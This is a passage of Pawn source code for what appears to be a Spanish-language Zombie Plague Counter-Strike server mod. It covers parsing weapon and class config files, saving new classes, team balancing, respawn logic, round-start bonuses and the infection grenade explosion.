						// Add to sounds array
						ArrayPushString(sound_swarm, key)
					}
				}
				else if (equal(key, "ROUND MULTI"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_multi, key)
					}
				}
				else if (equal(key, "ROUND PLAGUE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_plague, key)
					}
				}
				else if (equal(key, "GRENADE INFECT EXPLODE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_infect, key)
					}
				}
				else if (equal(key, "GRENADE INFECT PLAYER"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_infect_player, key)
					}
				}
				else if (equal(key, "GRENADE FIRE EXPLODE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_fire, key)
					}
				}
				else if (equal(key, "GRENADE FIRE PLAYER"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_fire_player, key)
					}
				}
				else if (equal(key, "GRENADE FROST EXPLODE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_frost, key)
					}
				}
				else if (equal(key, "GRENADE FROST PLAYER"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_frost_player, key)
					}
				}
				else if (equal(key, "GRENADE FROST BREAK"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_frost_break, key)
					}
				}
				else if (equal(key, "GRENADE FLARE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(grenade_flare, key)
					}
				}
				else if (equal(key, "ANTIDOTE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_antidote, key)
					}
				}
			}*/
			case SECTION_BUY_MENU_WEAPONS:
			{
				if (equal(key, "PRIMARY"))
				{
					// Set up some vars to hold parsing info
					new szWeaponName[32], szLevel[32], szReset[32]
					
					// Parse weapons
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Parse resets
						strtok(key, szWeaponName, charsmax(szWeaponName), szReset, charsmax(szReset), ':')
						
						if( szReset[0] )
						{
							trim( szReset )
							ArrayPushCell( gPrimaryReset, str_to_num( szReset ) )
							
							// Parse levels with reset
							strtok(key, szReset, charsmax(szReset), szLevel, charsmax(szLevel), '=')
						}
						else
						{
							ArrayPushCell( gPrimaryReset, 0 )
							
							// Parse levels without reset
							strtok(key, szWeaponName, charsmax(szWeaponName), szLevel, charsmax(szLevel), '=')
						}
						
						if( szLevel[0] )
						{
							trim( szLevel )
							ArrayPushCell( gPrimaryLevel, str_to_num( szLevel ) )
						}
						else 
						{
							ArrayPushCell( gPrimaryLevel, 1 )
						}
						
						// Trim spaces
						trim( szWeaponName )
						
						// Add to weapons array
						ArrayPushString(g_primary_items, szWeaponName)
						ArrayPushCell(g_primary_weaponids, cs_weapon_name_to_id(szWeaponName))
					}
				}
				else if (equal(key, "SECONDARY"))
				{
					// Set up some vars to hold parsing info
					new szWeaponName[32], szLevel[32], szReset[32]
					
					// Parse weapons
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Parse resets
						strtok(key, szWeaponName, charsmax(szWeaponName), szReset, charsmax(szReset), ':')
						
						if( szReset[0] )
						{
							trim( szReset )
							ArrayPushCell( gSecondaryReset, str_to_num( szReset ) )
							
							// Parse levels with reset
							strtok(key, szReset, charsmax(szReset), szLevel, charsmax(szLevel), '=')
						}
						else
						{
							ArrayPushCell( gSecondaryReset, 0 )
							
							// Parse levels without reset
							strtok(key, szWeaponName, charsmax(szWeaponName), szLevel, charsmax(szLevel), '=')
						}
						
						if( szLevel[0] )
						{
							trim( szLevel )
							ArrayPushCell( gSecondaryLevel, str_to_num( szLevel ) )
						}
						else 
						{
							ArrayPushCell( gSecondaryLevel, 1 )
						}
						
						// Trim spaces
						trim( szWeaponName )
						
						// Add to weapons array
						ArrayPushString(g_secondary_items, szWeaponName)
						ArrayPushCell(g_secondary_weaponids, cs_weapon_name_to_id(szWeaponName))
					}
				}
				else if (equal(key, "ADDITIONAL ITEMS"))
				{
					// Parse weapons
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to weapons array
						ArrayPushString(g_additional_items, key)
					}
				}
			}
			/*case SECTION_EXTRA_ITEMS_WEAPONS:
			{
				if (equal(key, "NAMES"))
				{
					// Parse weapon items
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to weapons array
						ArrayPushString(g_extraweapon_names, key)
					}
				}
				else if (equal(key, "ITEMS"))
				{
					// Parse weapon items
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to weapons array
						ArrayPushString(g_extraweapon_items, key)
					}
				}
				else if (equal(key, "COSTS"))
				{
					// Parse weapon items
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to weapons array
						ArrayPushCell(g_extraweapon_costs, str_to_num(key))
					}
				}
			}*/
			case SECTION_HARD_CODED_ITEMS_COSTS:
			{
				if (equal(key, "NIGHT VISION"))
					g_extra_costs2[EXTRA_NVISION] = str_to_num(value)
				else if (equal(key, "ANTIDOTE"))
					g_extra_costs2[EXTRA_ANTIDOTE] = str_to_num(value)
				else if (equal(key, "ZOMBIE MADNESS"))
					g_extra_costs2[EXTRA_MADNESS] = str_to_num(value)
				else if (equal(key, "INFECTION BOMB"))
					g_extra_costs2[EXTRA_INFBOMB] = str_to_num(value)
				else if (equal(key, "BALAS INFINITAS"))
				{
					g_extra_costs2[EXTRA_UNLIMITED_CLIP] = str_to_num(value)
					g_extra_costs2[EXTRA_PRECISION_CLIP] = floatround(float(str_to_num(value)) * 1.55)
				}
				else if (equal(key, "100 CHALECO"))
					g_extra_costs2[EXTRA_ARMOR] = str_to_num(value)	
			}
		}
	}
	if (file) fclose(file)
	
	// Build zombie classes file path
	get_configsdir(path, charsmax(path))
	format(path, charsmax(path), "%s/%s", path, ZP_ZOMBIECLASSES_FILE)
	
	// Parse if present
	if (file_exists(path))
	{
		// Open zombie classes file for reading
		file = fopen(path, "rt")
		
		while (file && !feof(file))
		{
			// Read one line at a time
			fgets(file, linedata, charsmax(linedata))
			
			// Replace newlines with a null character to prevent headaches
			replace(linedata, charsmax(linedata), "^n", "")
			
			// Blank line or comment
			if (!linedata[0] || linedata[0] == ';') continue;
			
			// New class starting
			if (linedata[0] == '[')
			{
				// Remove first and last characters (braces)
				linedata[strlen(linedata) - 1] = 0
				copy(linedata, charsmax(linedata), linedata[1])
				
				// Store its real name for future reference
				ArrayPushString(g_zclass2_realname, linedata)
				continue;
			}
			
			// Get key and value(s)
			strtok(linedata, key, charsmax(key), value, charsmax(value), '=')
			
			// Trim spaces
			trim(key)
			trim(value)
			
			if (equal(key, "NAME"))
				ArrayPushString(g_zclass2_name, value)
			else if (equal(key, "INFO"))
				ArrayPushString(g_zclass2_info, value)
			else if (equal(key, "MODELS"))
			{
				// Set models start index
				ArrayPushCell(g_zclass2_modelsstart, ArraySize(g_zclass2_playermodel))
				
				// Parse class models
				while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
				{
					// Trim spaces
					trim(key)
					trim(value)
					
					// Add to class models array
					ArrayPushString(g_zclass2_playermodel, key)
					ArrayPushCell(g_zclass2_modelindex, -1)
				}
				
				// Set models end index
				ArrayPushCell(g_zclass2_modelsend, ArraySize(g_zclass2_playermodel))
			}
			else if (equal(key, "CLAWMODEL"))
				ArrayPushString(g_zclass2_clawmodel, value)
			else if (equal(key, "HEALTH"))
				ArrayPushCell(g_zclass2_hp, str_to_num(value))
			else if (equal(key, "SPEED"))
				ArrayPushCell(g_zclass2_spd, str_to_num(value))
			else if (equal(key, "GRAVITY"))
				ArrayPushCell(g_zclass2_grav, str_to_float(value))
			else if (equal(key, "DAMAGE"))
				ArrayPushCell(g_zclass2_dmg, str_to_float(value))
			else if (equal(key, "LEVEL"))
				ArrayPushCell(g_zclass2_level, str_to_num(value))
			else if (equal(key, "RESET"))
				ArrayPushCell(g_zclass2_reset, str_to_num(value))
		}
		if (file) fclose(file)
	}
	
	// Build human classes file path
	get_configsdir(path, charsmax(path))
	format(path, charsmax(path), "%s/%s", path, ZP_HUMANCLASSES_FILE)
	
	// Parse if present
	if (file_exists(path))
	{
		// Open zombie classes file for reading
		file = fopen(path, "rt")
		
		while (file && !feof(file))
		{
			// Read one line at a time
			fgets(file, linedata, charsmax(linedata))
			
			// Replace newlines with a null character to prevent headaches
			replace(linedata, charsmax(linedata), "^n", "")
			
			// Blank line or comment
			if (!linedata[0] || linedata[0] == ';') continue;
			
			// New class starting
			if (linedata[0] == '[')
			{
				// Remove first and last characters (braces)
				linedata[strlen(linedata) - 1] = 0
				copy(linedata, charsmax(linedata), linedata[1])
				
				// Store its real name for future reference
				ArrayPushString(g_hclass2_realname, linedata)
				continue;
			}
			
			// Get key and value(s)
			strtok(linedata, key, charsmax(key), value, charsmax(value), '=')
			
			// Trim spaces
			trim(key)
			trim(value)
			
			if (equal(key, "NAME"))
				ArrayPushString(g_hclass2_name, value)
			else if (equal(key, "INFO"))
				ArrayPushString(g_hclass2_info, value)
			else if (equal(key, "MODELS"))
			{
				// Set models start index
				ArrayPushCell(g_hclass2_modelsstart, ArraySize(g_hclass2_playermodel))
				
				// Parse class models
				while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
				{
					// Trim spaces
					trim(key)
					trim(value)
					
					// Add to class models array
					ArrayPushString(g_hclass2_playermodel, key)
					ArrayPushCell(g_hclass2_modelindex, -1)
				}
				
				// Set models end index
				ArrayPushCell(g_hclass2_modelsend, ArraySize(g_hclass2_playermodel))
			}
			else if (equal(key, "CLAWMODEL"))
				ArrayPushString(g_hclass2_clawmodel, value)
			else if (equal(key, "HEALTH"))
				ArrayPushCell(g_hclass2_hp, str_to_num(value))
			else if (equal(key, "SPEED"))
				ArrayPushCell(g_hclass2_spd, str_to_num(value))
			else if (equal(key, "GRAVITY"))
				ArrayPushCell(g_hclass2_grav, str_to_float(value))
			else if (equal(key, "ARMOR"))
				ArrayPushCell(g_hclass2_armor, str_to_num(value))
			else if (equal(key, "DAMAGE"))
				ArrayPushCell(g_hclass2_dmg, str_to_float(value))
			else if (equal(key, "LEVEL"))
				ArrayPushCell(g_hclass2_level, str_to_num(value))
			else if (equal(key, "RESET"))
				ArrayPushCell(g_hclass2_reset, str_to_num(value))	
		}
		if (file) fclose(file)
	}
}

save_customization()
{
	new i, k, buffer[512]
	
	// Build zombie classes file path
	new path[64]
	get_configsdir(path, charsmax(path))
	format(path, charsmax(path), "%s/%s", path, ZP_ZOMBIECLASSES_FILE)
	
	// Open zombie classes file for appending data
	new file = fopen(path, "at"), size = ArraySize(g_zclass_name)
	
	// Add any new zombie classes data at the end if needed
	for (i = 0; i < size; i++)
	{
		if (ArrayGetCell(g_zclass_new, i))
		{
			// Add real name
			ArrayGetString(g_zclass_name, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^n[%s]", buffer)
			fputs(file, buffer)
			
			// Add caption
			ArrayGetString(g_zclass_name, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nNAME = %s", buffer)
			fputs(file, buffer)
			
			// Add info
			ArrayGetString(g_zclass_info, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nINFO = %s", buffer)
			fputs(file, buffer)
			
			// Add models
			for (k = ArrayGetCell(g_zclass_modelsstart, i); k < ArrayGetCell(g_zclass_modelsend, i); k++)
			{
				if (k == ArrayGetCell(g_zclass_modelsstart, i))
				{
					// First model, overwrite buffer
					ArrayGetString(g_zclass_playermodel, k, buffer, charsmax(buffer))
				}
				else
				{
					// Successive models, append to buffer
					ArrayGetString(g_zclass_playermodel, k, path, charsmax(path))
					format(buffer, charsmax(buffer), "%s , %s", buffer, path)
				}
			}
			format(buffer, charsmax(buffer), "^nMODELS = %s", buffer)
			fputs(file, buffer)
			
			// Add clawmodel
			ArrayGetString(g_zclass_clawmodel, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nCLAWMODEL = %s", buffer)
			fputs(file, buffer)
			
			// Add health
			formatex(buffer, charsmax(buffer), "^nHEALTH = %d", ArrayGetCell(g_zclass_hp, i))
			fputs(file, buffer)
			
			// Add speed
			formatex(buffer, charsmax(buffer), "^nSPEED = %d", ArrayGetCell(g_zclass_spd, i))
			fputs(file, buffer)
			
			// Add gravity
			formatex(buffer, charsmax(buffer), "^nGRAVITY = %.2f", Float:ArrayGetCell(g_zclass_grav, i))
			fputs(file, buffer)
			
			// Add damage
			formatex(buffer, charsmax(buffer), "^nDAMAGE = %.2f", Float:ArrayGetCell(g_zclass_dmg, i))
			fputs(file, buffer)
			
			// Add level
			formatex(buffer, charsmax(buffer), "^nLEVEL = %d", ArrayGetCell(g_zclass_level, i))
			fputs(file, buffer)
			
			// Add reset
			formatex(buffer, charsmax(buffer), "^nRESET = %d^n", ArrayGetCell(g_zclass_reset, i))
			fputs(file, buffer)
		}
	}
	fclose(file)
	
	// Build human classes file path
	get_configsdir(path, charsmax(path))
	format(path, charsmax(path), "%s/%s", path, ZP_HUMANCLASSES_FILE)
	
	// Open human classes file for appending data
	file = fopen(path, "at"), size = ArraySize(g_hclass_name)
	
	// Add any new human classes data at the end if needed
	for (i = 0; i < size; i++)
	{
		if (ArrayGetCell(g_hclass_new, i))
		{
			// Add real name
			ArrayGetString(g_hclass_name, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^n[%s]", buffer)
			fputs(file, buffer)
			
			// Add caption
			ArrayGetString(g_hclass_name, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nNAME = %s", buffer)
			fputs(file, buffer)
			
			// Add info
			ArrayGetString(g_hclass_info, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nINFO = %s", buffer)
			fputs(file, buffer)
			
			// Add models
			for (k = ArrayGetCell(g_hclass_modelsstart, i); k < ArrayGetCell(g_hclass_modelsend, i); k++)
			{
				if (k == ArrayGetCell(g_hclass_modelsstart, i))
				{
					// First model, overwrite buffer
					ArrayGetString(g_hclass_playermodel, k, buffer, charsmax(buffer))
				}
				else
				{
					// Successive models, append to buffer
					ArrayGetString(g_hclass_playermodel, k, path, charsmax(path))
					format(buffer, charsmax(buffer), "%s , %s", buffer, path)
				}
			}
			format(buffer, charsmax(buffer), "^nMODELS = %s", buffer)
			fputs(file, buffer)
			
			// Add clawmodel
			ArrayGetString(g_hclass_clawmodel, i, buffer, charsmax(buffer))
			format(buffer, charsmax(buffer), "^nCLAWMODEL = %s", buffer)
			fputs(file, buffer)
			
			// Add health
			formatex(buffer, charsmax(buffer), "^nHEALTH = %d", ArrayGetCell(g_hclass_hp, i))
			fputs(file, buffer)
			
			// Add speed
			formatex(buffer, charsmax(buffer), "^nSPEED = %d", ArrayGetCell(g_hclass_spd, i))
			fputs(file, buffer)
			
			// Add gravity
			formatex(buffer, charsmax(buffer), "^nGRAVITY = %.2f", Float:ArrayGetCell(g_hclass_grav, i))
			fputs(file, buffer)
			
			// Add armor
			formatex(buffer, charsmax(buffer), "^nARMOR = %d", ArrayGetCell(g_hclass_armor, i))
			fputs(file, buffer)
			
			// Add damage
			formatex(buffer, charsmax(buffer), "^nDAMAGE = %.2f", Float:ArrayGetCell(g_hclass_dmg, i))
			fputs(file, buffer)
			
			// Add level
			formatex(buffer, charsmax(buffer), "^nLEVEL = %d", ArrayGetCell(g_hclass_level, i))
			fputs(file, buffer)
			
			// Add reset
			formatex(buffer, charsmax(buffer), "^nRESET = %d^n", ArrayGetCell(g_hclass_reset, i))
			fputs(file, buffer)
		}
	}
	fclose(file)
	
	// Free arrays containing class/item overrides
	ArrayDestroy(g_zclass2_realname)
	ArrayDestroy(g_zclass2_name)
	ArrayDestroy(g_zclass2_info)
	ArrayDestroy(g_zclass2_modelsstart)
	ArrayDestroy(g_zclass2_modelsend)
	ArrayDestroy(g_zclass2_playermodel)
	ArrayDestroy(g_zclass2_modelindex)
	ArrayDestroy(g_zclass2_clawmodel)
	ArrayDestroy(g_zclass2_hp)
	ArrayDestroy(g_zclass2_spd)
	ArrayDestroy(g_zclass2_grav)
	ArrayDestroy(g_zclass2_dmg)
	ArrayDestroy(g_zclass2_level)
	ArrayDestroy(g_zclass2_reset)
	ArrayDestroy(g_zclass_new)
	ArrayDestroy(g_extraitem_new)
	ArrayDestroy(g_hclass2_realname)
	ArrayDestroy(g_hclass2_name)
	ArrayDestroy(g_hclass2_info)
	ArrayDestroy(g_hclass2_modelsstart)
	ArrayDestroy(g_hclass2_modelsend)
	ArrayDestroy(g_hclass2_playermodel)
	ArrayDestroy(g_hclass2_modelindex)
	ArrayDestroy(g_hclass2_clawmodel)
	ArrayDestroy(g_hclass2_hp)
	ArrayDestroy(g_hclass2_spd)
	ArrayDestroy(g_hclass2_grav)
	ArrayDestroy(g_hclass2_dmg)
	ArrayDestroy(g_hclass2_armor)
	ArrayDestroy(g_hclass2_level)
	ArrayDestroy(g_hclass2_reset)
	ArrayDestroy(g_hclass_new)
}

// Disable minmodels task
public disable_minmodels(id)
{
	if (!g_isconnected[id]) return;
	client_cmd(id, "cl_minmodels 0")
}

// Refill BP Ammo Task
public refill_bpammo(const args[], id)
{
	// Player died or turned into a zombie
	if (!g_isalive[id] || g_zombie[id])
		return;
	
	set_msg_block(g_msgAmmoPickup, BLOCK_ONCE)
	ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[REFILL_WEAPONID], AMMOTYPE[REFILL_WEAPONID], MAXBPAMMO[REFILL_WEAPONID])
}

// Balance Teams Task
balance_teams()
{
	// Get amount of users playing
	static iPlayersnum
	iPlayersnum = fnGetPlaying()
	
	// No players, don't bother
	if (iPlayersnum < 1) return;
	
	// Split players evenly
	static iTerrors, iMaxTerrors, id, team[33]
	iMaxTerrors = iPlayersnum/2
	iTerrors = 0
	
	// First, set everyone to CT
	for (id = 1; id <= g_maxplayers; id++)
	{
		// Skip if not connected
		if (!g_isconnected[id])
			continue;
		
		team[id] = fm_cs_get_user_team(id)
		
		// Skip if not playing
		if (team[id] == FM_CS_TEAM_SPECTATOR || team[id] == FM_CS_TEAM_UNASSIGNED)
			continue;
		
		// Set team
		remove_task(id+TASK_TEAM)
		fm_cs_set_user_team(id, FM_CS_TEAM_CT)
		team[id] = FM_CS_TEAM_CT
	}
	
	// Then randomly set half of the players to Terrorists
	while (iTerrors < iMaxTerrors)
	{
		// Keep looping through all players
		if (++id > g_maxplayers) id = 1
		
		// Skip if not connected
		if (!g_isconnected[id])
			continue;
		
		// Skip if not playing or already a Terrorist
		if (team[id] != FM_CS_TEAM_CT)
			continue;
		
		// Random chance
		if (random_num(0, 1))
		{
			fm_cs_set_user_team(id, FM_CS_TEAM_T)
			team[id] = FM_CS_TEAM_T
			iTerrors++
		}
	}
}

// Welcome Message Task
public welcome_msg()
{
	// Show mod info
	//CC(0, "!y**** !g%s!y editado por Kiske para Taringa! CS ****", g_modname)
	//CC(0, "!g[ZP]!y Presiona M para mostrar el menú de juego")
	
	// Show T-virus HUD notice
	set_hudmessage(0, 125, 200, HUD_EVENT_X, HUD_EVENT_Y, 0, 0.0, 3.0, 2.0, 1.0, -1)
	ShowSyncHudMsg(0, g_MsgSync, "El Virus-T se ha liberado...")
	
	// TAN ?
	static iDia, iMes, iAnio, iTiempo;
	date( iAnio, iMes, iDia )
	
	iTiempo = get_systime( ) + ( -3 * gHOUR_SECONDS )
	
	if( iTiempo >= TimeToUnix( iAnio, iMes, iDia, 00, 00, 00 ) && iTiempo < TimeToUnix( iAnio, iMes, iDia, 05, 00, 00 ) )
	{
		CC( 0, "!g[ZP] T! AT NITE.!y Tus ganancias de ammo packs se !gmultiplican x3!y y siendo !gpremium x6!y")
		gTH = 1
	}
	else gTH = 0
	
	//TutorCreate(0, "PEPA_PUTO", RED, 12.0, gTH)
	
	// Reset bought infection bombs counter
	
	// Reset Extra Items
	for( new id = 1; id <= g_maxplayers; id++ )
	{
		if( g_isconnected[id] )
		{
			g_antidotecounter[id] = 1
			ITEM_EXTRA_BalasInfinitas[id] = 0
			ITEM_EXTRA_BalasPrecision[id] = 0
			gLogro_ZombieDie[id] = 0;
			
			if( get_user_flags( id ) & ADMIN_RESERVATION )
			{
				switch( gTH )
				{
					case 0: gTH_Mult[id][0] = 4
					case 1: gTH_Mult[id][0] = 6 // TAN
				}
				
				gTH_Mult[id][1] = 2
			}
			else
			{
				switch( gTH )
				{
					case 0: gTH_Mult[id][0] = 2
					case 1: gTH_Mult[id][0] = 3 // TAN
				}
				
				gTH_Mult[id][1] = 1
			}
			
			if( gWinMult_Change[0] > 0 ) gTH_Mult[id][0] = gWinMult_Change[0]
			if( gWinMult_Change[1] > 0 ) gTH_Mult[id][1] = gWinMult_Change[1]
		}
	}
}

// Respawn Player Task
public respawn_player_task(taskid)
{
	// Get player's team
	static team
	team = fm_cs_get_user_team(ID_SPAWN)
	
	// Respawn player automatically if allowed on current round
	if (!g_endround && team != FM_CS_TEAM_SPECTATOR && team != FM_CS_TEAM_UNASSIGNED && !g_isalive[ID_SPAWN] && 
	(!g_survround) &&
	(!g_swarmround) &&
	(!g_nemround) && 
	(!gTrollRound) &&
	(!g_plagueround) &&
	!gArmageddonRound &&
	!gSynapsisRound &&
	!gL4DRound &&
	!gWeskerRound &&
	!gJasonRound &&
	!gSniperRound &&
	!gTaringaRound )
	{
		// Override respawn as zombie setting on nemesis and survivor rounds
		if (g_survround || gArmageddonRound || gL4DRound || gWeskerRound || gJasonRound || gSniperRound ) g_respawn_as_zombie[ID_SPAWN] = true
		else if (g_nemround || gTrollRound || gSynapsisRound || gTaringaRound) g_respawn_as_zombie[ID_SPAWN] = false
		
		respawn_player_manually(ID_SPAWN)
	}
}

// Respawn Player Manually (called after respawn checks are done)
respawn_player_manually(id)
{
	// Set proper team before respawning, so that the TeamInfo message that's sent doesn't confuse PODBots
	if (g_respawn_as_zombie[id])
		fm_cs_set_user_team(id, FM_CS_TEAM_T)
	else
		fm_cs_set_user_team(id, FM_CS_TEAM_CT)
	
	// Respawning a player has never been so easy
	ExecuteHamB(Ham_CS_RoundRespawn, id)
}

// Check Round Task -check that we still have both zombies and humans on a round-
check_round(leaving_player)
{
	// Round ended or make_a_zombie task still active
	if (g_endround || task_exists(TASK_MAKEZOMBIE))
		return;
	
	// Get alive players count
	static iPlayersnum, id
	iPlayersnum = fnGetAlive()
	
	// Last alive player, don't bother
	if (iPlayersnum < 2)
		return;
	
	// Last zombie disconnecting
	if (g_zombie[leaving_player] && fnGetZombies() == 1)
	{
		// Only one CT left, don't bother
		if (fnGetHumans() == 1 && fnGetCTs() == 1)
			return;
		
		// Pick a random one to take his place
		while ((id = fnGetRandomAlive(random_num(1, iPlayersnum))) == leaving_player ) { /* keep looping */ }
		
		// Set player leaving flag
		g_lastplayerleaving = true
		
		// Turn into a Nemesis or just a zombie?
		if (g_nemesis[leaving_player] && g_nemround)
		{
			zombieme(id, 0, 1, 0, 0, 0)
			CC(0, "!g[ZP]!y El nemesis se ha ido, %s es el nuevo nemesis", g_playername[id])
			
			set_user_health(id, get_user_health(leaving_player))
		}
		else
		{
			zombieme(id, 0, 0, 0, 0, 0)
			CC(0, "!g[ZP]!y El único zombie vivo se ha ido, %s es el nuevo zombie", g_playername[id])
		}
		
		// Remove player leaving flag
		g_lastplayerleaving = false
	}
	
	// Last human disconnecting
	else if (!g_zombie[leaving_player] && fnGetHumans() == 1)
	{
		// Only one T left, don't bother
		if (fnGetZombies() == 1 && fnGetTs() == 1)
			return;
		
		// Pick a random one to take his place
		while ((id = fnGetRandomAlive(random_num(1, iPlayersnum))) == leaving_player ) { /* keep looping */ }
		
		// Show last human left notice
		CC(0, "!g[ZP]!y El último humano se ha ido, %s es el nuevo humano", g_playername[id])
		
		// Set player leaving flag
		g_lastplayerleaving = true
		
		// Turn into a Survivor/Wesker/Ninja/Sniper or just a human?
		if (g_survivor[leaving_player])
			humanme(id, 1, 0, 0, 0, 0, 0)
		else if(gWesker[leaving_player])
			humanme(id, 0, 0, 0, 1, 0, 0)
		else if(gJason[leaving_player])
			humanme(id, 0, 0, 0, 0, 1, 0)
		else if(gSniper[leaving_player])
			humanme(id, 0, 0, 0, 0, 0, 1)
		else
			humanme(id, 0, 0, 0, 0, 0, 0)
		
		// Remove player leaving flag
		g_lastplayerleaving = false
		
		// If Survivor, set chosen player's health to that of the one who's leaving
		if (g_survivor[leaving_player])
			set_user_health(id, get_user_health(leaving_player))
	}
}

// Lighting Effects Task
public lighting_effects()
{
	// Set lighting
	engfunc(EngFunc_LightStyle, 0, g_szCharLight)
}

// Remove Spawn Protection Task
public remove_spawn_protection(taskid)
{
	// Not alive
	if (!g_isalive[ID_SPAWN])
		return;
	
	// Remove spawn protection
	g_nodamage[ID_SPAWN] = false
	entity_set_int(ID_SPAWN, EV_INT_effects, entity_get_int(ID_SPAWN, EV_INT_effects) & ~EF_NODRAW)
}

// Hide Player's Money Task
public task_hide_money(taskid)
{
	// Not alive
	if (!g_isalive[ID_SPAWN])
		return;
	
	// Hide money
	message_begin(MSG_ONE, g_msgHideWeapon, _, ID_SPAWN)
	write_byte(HIDE_MONEY) // what to hide bitsum
	message_end()
	
	// Hide the HL crosshair that's drawn
	message_begin(MSG_ONE, g_msgCrosshair, _, ID_SPAWN)
	write_byte(0) // toggle
	message_end()
}

// Turn Off Flashlight and Restore Batteries
turn_off_flashlight(id)
{
	entity_set_int( id, EV_INT_effects, entity_get_int( id, EV_INT_effects ) & ~EF_DIMLIGHT )
	
	//fm_cs_set_user_batteries(id, 100)
	message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "Flashlight" ), _, id )
	write_byte( 0 ) // HUD FlashLight
	write_byte( 100 )
	message_end( )
	
	entity_set_int( id, EV_INT_impulse, 0 )
}

// Infection Bomb Explosion
infection_explode(ent)
{
	// Round ended (bugfix)
	if (g_endround) return;
	
	// Get origin
	static Float:originF[3]
	pev(ent, pev_origin, originF)
	
	// Get attacker
	static attacker
	attacker = pev(ent, pev_owner)
	
	// Infection bomb owner disconnected? (bugfix)
	if (!is_user_valid_connected(attacker))
	{
		// Get rid of the grenade
		engfunc(EngFunc_RemoveEntity, ent)
		return;
	}
	
	// Make the explosion
	create_blast(originF)
	
	// Infection nade explode sound
	//static sound[64]
	//ArrayGetString(grenade_infect, random_num(0, ArraySize(grenade_infect) - 1), sound, charsmax(sound))
	emit_sound(ent, CHAN_WEAPON, gSOUND_INFECT_EXPLODE, 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	// Collisions
	static victim
	victim = -1
	
	new i_CountInfects = 0;
	
	while ((victim = engfunc(EngFunc_FindEntityInSphere, victim, originF, NADE_EXPLOSION_RADIUS)) != 0)
	{
		// Only effect alive non-spawnprotected humans
		if (!is_user_valid_alive(victim) || g_zombie[victim] || g_nodamage[victim])
			continue;
		
		// Last human is killed
		if (fnGetHumans() == 1)
		{
			ExecuteHamB(Ham_Killed, victim, attacker, 0)
			i_CountInfects++;
			
			if(i_CountInfects >= 15)
			{
				fnUpdateLogros(attacker, LOGRO_ZOMBIE, LA_BOMBA_VERDE)
			}
			
			continue;
		}
		
		i_CountInfects++;
		
		// Infected victim's sound
		//ArrayGetString(grenade_infect_player, random_num(0, ArraySize(grenade_infect_player) - 1), sound, charsmax(sound))
		emit_sound(victim, CHAN_VOICE, gSOUND_INFECT_PLAYER[random_num(0, sizeof gSOUND_INFECT_PLAYER -1)], 1.0, ATTN_NORM, 0, PITCH_NORM)
		
		// Turn into zombie
		zombieme(victim, attacker, 0, 1, 1, 0)
	}
	
	if(i_CountInfects >= 15)
	{
		fnUpdateLogros(attacker, LOGRO_ZOMBIE, LA_BOMBA_VERDE)
	}
	
	// Get rid of the grenade
	remove_entity(ent)
}

// Fire Grenade Explosion
fire_explode(ent)
{
	// Get origin
	static Float:originF[3]
